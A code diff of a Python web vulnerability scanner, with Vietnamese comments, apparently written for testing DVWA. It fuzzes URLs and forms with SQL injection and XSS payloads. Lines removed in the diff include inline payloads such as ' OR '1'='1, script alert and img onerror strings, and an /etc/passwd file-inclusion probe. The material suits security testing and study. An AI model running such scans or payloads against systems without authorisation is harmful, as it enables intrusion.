@@ -1,199 +1,239 @@
 import requests
-from urllib.parse import urljoin
-from bs4 import BeautifulSoup
-import re
+from bs4 import BeautifulSoup as bs
+from urllib.parse import urlparse, urljoin
 import sys
-import threading
-# from Antidetect import *
+import re 
+import urllib.parse
 
 
+s = requests.Session()
+s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/117.0.5938.92"
 
+# login_payload = {
+#     "username": "admin",
+#     "password": "password",
+#     "Login": "Login",
+# }
+# # change URL to the login page of your DVWA login URL
+# login_url = "http://192.168.168.105/dvwa/login.php"
+
+# # login
+# r = s.get(login_url)
+# token = re.search("user_token'\s*value='(.*?)'", r.text).group(1)
+# login_payload['user_token'] = token
+# s.post(login_url, data=login_payload)
+
+
+# ---------------------------------------------------------------
+#DEF SCAN WEBSITE
+forms = []
 def scan_website(url):
-    # user_agent = get_random_user_agent()
-    # proxy = get_random_proxy()
-    results = []
-    
-    # Crawl website 
-    urls = crawl(url)
-    
-    # Scan URLs
-    for u in urls:
-        # response = requests.get(url, headers={'User-Agent': user_agent}, proxies={'http': proxy, 'https': proxy})
+  soup = bs(s.get(url).content, "html.parser")
+  results = {
+    "sqli": [] ,
+    "xss": []
+  }
+  urls = urlparse(url)
+  global forms
+  forms = bs(s.get(url).content, "html.parser").find_all("form")
 
-        response = requests.get(u)
-        
-        if check_sqli(u, response):
-            results.append({'url': u, 'vuln': 'SQL Injection'})
-            
-        if check_xss(u, response):
-            results.append({'url': u, 'vuln': 'Cross Site Scripting'})
-            
-        if check_lfi(u):
-            results.append({'url': u, 'vuln': 'Local File Inclusion'})
-            
-    return results
-
-# Cache results 
-checked_urls = {}
-
-def crawl(url):
-  urls = []
+  # Scan SQLi
+  if check_sqli(url):
+    results["sqli"].append({
+      "url": url,
+      "details": "[+] SQL Injection detected"
+    })
   
-  def process_url(url):
-    response = requests.get(url)
-    parsed = BeautifulSoup(response.text, 'html.parser')
-    for link in parsed.find_all('a'):
-      path = link.get('href')  
-      if path and path.startswith('/'):
-        urls.append(urljoin(url, path))
+  # Scan XSS
+  if check_xss(url):
+    results["xss"].append({
+      "url": url,
+      "details": "[+] Cross Site Scripting detected"
+    })
 
-  threads = []
-  for i in range(10): 
-    t = threading.Thread(target=process_url, args=(url,))
-    t.start()
-    threads.append(t)
-
-  for t in threads:
-    t.join()
-
-  return urls
+  return results
 
 
-# Hàm kiểm tra SQL injection
-def check_sqli(url, response):
-  
-  test_urls = [
-    f"{url}' OR '1'='1", 
-    f"{url}' AND '1'='2",
-    f"{url}'; SELECT SLEEP(5); -- "
-  ]
+# -----------------------------------------------------
 
-  results = []
+# Hàm kiểm tra lỗ hổng SQLi
+def is_vulnerable_sqli(response):
+  # Kiểm tra các lỗi chung
+  errors = {
+    "you have an error in your sql syntax;",
+    "warning: mysql",
+    "unclosed quotation mark after the character string",
+    "quoted string not properly terminated",
+  }
 
-  payloads = ["'", "')--", "'+OR+'1'='1"]
-
-  for payload in payloads:
-    check_url = f"{url}{payload}"
-    response = requests.get(check_url)
-    if response.status_code >= 400:
-      results.append(payload)
-      print("\nFound SQLi by normal way at: ", check_url)
+  for error in errors:
+    if error in response.content.decode().lower():
       return True
-
-  checked_urls[url] = results
-  print("SQL injection scan completed")
-    
-
+  
   return False
 
+# ---------
 
+# ---------------------------------
+# Hàm lấy tất cả form trong trang
+def get_all_forms(url):
+  soup = bs(s.get(url).content, "html.parser")
+  return soup.find_all("form")
+
+# Hàm lấy chi tiết form 
+def get_form_details(form):
+  # Code phân tích form
+  details = {}
+  # get the form action (target url)
+  try:
+      action = form.attrs.get("action").lower()
+  except:
+      action = None
+
+  # get the form method (POST, GET, etc.)
+  method = form.attrs.get("method", "get").lower()
+
+  # get all the input details such as type and name
+  inputs = []
+  for input_tag in form.find_all("input"):
+      input_type = input_tag.attrs.get("type", "text")
+      input_name = input_tag.attrs.get("name")
+      input_value = input_tag.attrs.get("value", "")
+      inputs.append({"type": input_type, "name": input_name, "value": input_value})
+
+  # put everything to the resulting dictionary
+  details["action"] = action
+  details["method"] = method
+  details["inputs"] = inputs
+  return details
+
+
+
+# -------------------------------------------------------------
+def check_sqli(url):
   
+  with open('sqli_payload.txt') as f:
+    sqli_payloads = f.read().splitlines()
+    print("\n[+] Checking SQLi")
 
-# -----------------------------------------------------------------------
-# Hàm kiểm tra XSS
-session = requests.Session()
-encoded_payloads = ["%3Cscript%3Ealert(1)%3C/script%3E", "%27%3Balert(1)//", "%3Cimg+src%3D1+onerror%3Dalert(1)%3E"]
-attr_payloads = ['" onclick="alert(1)', '" style="xss:expression(alert(1))'] 
-tag_payloads = ['<script>alert(1)</script>', '<img src=1 onerror=alert(1)>']
-url_payloads = ['javascript:alert(1)', 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
-                "?param=<script>alert(1)</script>",
-                "?param=javascript:alert(1)"]
+  for payload in sqli_payloads:
+    encoded_payload = urllib.parse.quote(payload)
+    new_url = f"{url}?id={encoded_payload}"
+    print("[!] Trying", new_url)
 
-html_payloads = [
-  "<img src=x onerror=alert(1)>",  
-  "<div id='<' onclick='alert(1)'>" 
-]
-
-def detect_context(url, response):
-  # Phân tích URL và response để xác định context
-  response = requests.get(url)
-
-  # context = detect_context(url, response.text) 
-  
-  if url.find("?") > 0:
-    return "url_param" 
-  elif response.text.find("<script>") > 0:
-    return "html_tag"
-  elif response.text.find("onclick=") > 0:
-    return "attribute"
-
-  return None
-
-def check_xss(url, response):
-
-  payloads = []
-
-  context = detect_context(url, response)
-  
-  if context == "url_param":
-    payloads = url_payloads
-  elif context == "html_tag":
-    payloads = html_payloads
-  elif context == "attribute":
-    payloads = attr_payloads
-
-  soup = BeautifulSoup(response.content, 'html.parser')
-
-  # Check forms
-  forms = soup.findAll('form')
-  for form in forms:
-    data = {} 
-    for input in form.findAll('input'):
-      for payload in payloads:
-        data[input.get('name')] = payload
-        response = session.post(url + form['action'], data=data)
-        if payload in response.text:
-          print('\nFound when checking XSS in:', url + form['action'])
-          return True
-
-  # Check URL parameters
-  params = re.findall(r'([^?=&]+)=([^&]*)', url)
-  for name, value in params:
-    for payload in payloads:
-      url = url.replace(f'{name}={value}', f'{name}={payload}')
-      response = session.get(url)
-      if payload in response.text:
-        print('\nFound when checking XSS in:', url)
+    # make the HTTP request
+    res = s.get(new_url)
+    if is_vulnerable_sqli(res):
+        # SQL Injection detected on the URL itself, 
+        # no need to preceed for extracting forms and submitting them
+        print("[+] SQL Injection vulnerability detected, link:", new_url)
         return True
 
-  for encoded_payload in encoded_payloads:
-    url = f"{url}?q={encoded_payload}"
-    response = requests.get(url)
-    
-    if encoded_payload in response.text:
-      print("\nFound when trying bypass filter with encoded payload: ", url)
-      return True
 
-    normal_payload = "<script>alert(1)</script>"
-    url = f"{url}?q={normal_payload}"
-    response = requests.get(url)
+  # test on HTML forms
+  forms = get_all_forms(url)
+  print(f"[+] Detected {len(forms)} forms on {url}")
+  
+  for form in forms:
+      form_details = get_form_details(form)
+      for payload in sqli_payloads:
 
-    if normal_payload not in response.text:
-      print("\nFound when checking site filters special characters from URL: ", url)
-      return True
+          # the data body we want to submit
+          data = {}
 
+          for input_tag in form_details["inputs"]:
+              if input_tag["value"] or input_tag["type"] == "hidden":
+                  # any input form that has some value or hidden,
+                  # just use it in the form body
+                  try:
+                      data[input_tag["name"]] = input_tag["value"] + payload
+                  except:
+                      pass
+              elif input_tag["type"] != "submit":
+                  # all others except submit, use some junk data with special character
+                  data[input_tag["name"]] = f"test{payload}"
 
+          # join the url with the action (form request URL)
+          url = urljoin(url, form_details["action"])
+          if form_details["method"] == "post":
+              res = s.post(url, data=data)
+          elif form_details["method"] == "get":
+              res = s.get(url, params=data)
+
+          curr_url = url
+          results = {
+              "sqli": []
+            }
+
+          if is_vulnerable_sqli(res):
+            # dùng curr_url thay vì new_url
+            results["sqli"].append({
+              "url": curr_url,  
+              "details": "[+] SQLi vulnerability detected"
+            }) 
+
+            return True
+  
+  print("[+] Check SQLi done")
   return False
 
 
 
-# -------------------------------------------------
-# Hàm kiểm tra LFI  
-def check_lfi(url):
-  pwd_paths = []
-  
-  with open('pwd.txt') as f:
-    pwd_paths = f.read().splitlines()
 
-  for path in pwd_paths:
- # Thử truy cập đến file /etc/passwd với các giá trị dẫn đến file/etc/pwd trong file pwd.txt
-    lfi_url = url + path
-    lfi_response = requests.get(lfi_url)
-  
-  # Nếu trả về nội dung file passwd là có LFI
-  if "root:" in lfi_response.text and "nobody:" in lfi_response.text:
-    print("Detected LFI")
-    return True
-  
+# ---------------------------------------------------------------------
+# Đọc các payload XSS từ file
+# CHeck XSS
+
+def check_xss(url):
+
+  # Đọc các payload XSS từ file
+  with open('xss_payload.txt') as f:
+    xss_payloads = f.read().splitlines()
+
+  print("\n[+] Checking XSS")
+
+  # Kiểm tra trực tiếp trên URL
+  for payload in xss_payloads:
+    # Mã hóa payload để sử dụng trong URL 
+    encoded_payload = urllib.parse.quote(payload) 
+    new_url = f"{url}?q={encoded_payload}"
+
+    print("[!] Trying", new_url)
+    res = s.get(new_url)
+
+    if payload in res.text:
+      print("[+] XSS vulnerability detected, link:", new_url)
+      return True
+
+  # Kiểm tra trên các form
+  forms = get_all_forms(url)
+  print(f"[+] Detected {len(forms)} forms on {url}")
+
+  for form in forms:
+    form_details = get_form_details(form)
+
+    for payload in xss_payloads:
+      data = {}
+
+      for input_tag in form_details["inputs"]:
+        if input_tag["value"] or input_tag["type"] == "hidden":
+          try:
+            data[input_tag["name"]] = input_tag["value"] + payload
+          except:
+            pass
+        elif input_tag["type"] != "submit":
+          data[input_tag["name"]] = payload
+      
+      url = urljoin(url, form_details["action"])
+      if form_details["method"] == "post":
+        res = s.post(url, data=data)
+      elif form_details["method"] == "get":
+        res = s.get(url, params=data)
+
+      if payload in res.text:
+        print("[+] XSS vulnerability detected, link:", url)
+        return True
+
+  print("[+] Check XSS done")
+
   return False
-  
